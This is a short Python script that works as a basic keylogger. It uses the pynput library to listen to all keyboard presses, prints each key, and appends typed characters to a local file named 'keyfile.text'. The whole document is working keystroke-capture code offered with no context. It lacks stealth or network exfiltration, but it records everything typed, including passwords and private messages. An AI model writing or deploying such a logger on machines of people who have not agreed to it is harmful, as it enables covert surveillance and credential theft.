from pynput import keyboard
# sudo apt install python3-pynput
def keyPressed(key):
    print(str(key))
    with open("keyfile.text", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error Getting Char:")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()